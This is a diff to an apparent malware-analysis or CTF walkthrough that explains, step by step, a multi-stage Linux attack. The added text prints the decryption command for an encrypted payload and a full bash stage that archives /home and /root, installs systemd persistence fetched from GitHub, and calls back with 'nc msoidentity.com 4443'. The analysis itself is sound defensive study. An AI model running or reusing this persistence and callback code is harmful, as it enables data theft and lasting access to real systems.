@@ -87,4 +87,47 @@ chmod +x "$CHECK_SCRIPT"
 (crontab -l 2>/dev/null | grep -v "$CHECK_SCRIPT"; echo "$CRON_INTERVAL $CHECK_SCRIPT # $CRON_JOB_NAME") | crontab -
 ```
 
-Here's the next steps in the attack, first a couple variables are declared to be used later in the script, including a new URL to explore "msoidentity.com/backup_info".
+Here's the next steps in the attack. First a couple variables are declared to be used in the script, including a new URL to explore "msoidentity.com/backup_info". A new script is being created, called "check_backup.sh". The first thing it does is check if there is a file at "/opt/backup.sh" which - you guessed it - is _another_ script. If that file doesn't exist yet the script creates it by getting it from that URL we just mentioned. The script seems to come encrypted and needs to be decrypted using AES-256-CBC and with the password "45337a3067335f56475f". The check backup script then is added as a cron job that gets ran every five minutes, meaning that every five minutes the backup script will be re-downloaded onto this system if it wasn't already there.
+
+Once again visiting the URL provides us with the next script to explore. As already explained, the file comes encrypted and can be decrypted using the same exact command that's already in the script:
+
+```openssl enc -nosalt -aes-256-cbc -d -in backup.enc -out backup.sh -pass pass:"45337a3067335f56475f"```
+
+```
+#!/bin/bash
+BACKUP_DIR="/tmp/backups"
+TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
+ARCHIVE_NAME="backup_${TIMESTAMP}.7z"
+ARCHIVE_PATH="${BACKUP_DIR}/${ARCHIVE_NAME}"
+SERVICE_NAME="NightlyBackup"
+SCRIPT_PATH="/opt/backup.sh"
+UNIT_PATH="/etc/systemd/system/${SERVICE_NAME}.service"
+TIMER_NAME="${SERVICE_NAME}.timer"
+TIMER_UNIT="/etc/systemd/system/${TIMER_NAME}"
+
+
+mkdir -p "$BACKUP_DIR"
+rm -rf backup_*
+7z a -mx=9 "$ARCHIVE_PATH" /home /root
+
+if systemctl list-unit-files | grep -q "^${SERVICE_NAME}.service"; then
+    systemctl enable "$SERVICE_NAME"
+else
+        curl -s https://raw.githubusercontent.com/supremeleaderbrian/services/refs/heads/main/backup.service > $UNIT_PATH
+        curl -s https://raw.githubusercontent.com/supremeleaderbrian/services/refs/heads/main/backup.timer > $TIMER_UNIT
+fi
+
+systemctl daemon-reexec
+systemctl daemon-reload
+systemctl enable "$SERVICE_NAME"
+systemctl enable --now "$TIMER_NAME"
+
+#Callback - WE GOT THEM
+sudo nc msoidentity.com 4443
+```
+
+We start with more variables being created, almost all of which are either parts of filenames or file paths. Then a backup directory is created, and all of the contents of the /home and /root directory are compressed and archived there. After, it checks for the NightlyBackup service in systemctl, and if it doesn't exist then it grabs two files from a users github repo that look like this:
+
+![image](https://github.com/user-attachments/assets/dfabe7a9-10d0-436b-a5a2-82800fd64f66)
+![image](https://github.com/user-attachments/assets/8dab6c59-f237-42c5-93a9-9b3176515cd9)
+
